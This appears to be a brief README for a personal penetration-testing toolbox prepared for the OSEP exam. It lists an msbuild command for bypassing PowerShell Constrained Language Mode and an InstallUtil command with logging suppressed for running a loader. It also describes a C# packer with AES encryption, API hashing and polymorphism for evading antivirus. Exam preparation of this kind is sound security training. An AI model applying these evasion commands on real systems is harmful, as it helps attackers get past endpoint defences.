# MyOSEPToolBox"

## CLM Bypass

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj
```

## Packer

Packer is made extra for OSEP in C#. It has the following features:

- Automatic AES-128-CBC encryption
- API Hashing
- Polymorphism

Execute via `Installutil.exe`:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U loader.exe
```

Probably way too overkill, but better be safe ^^.
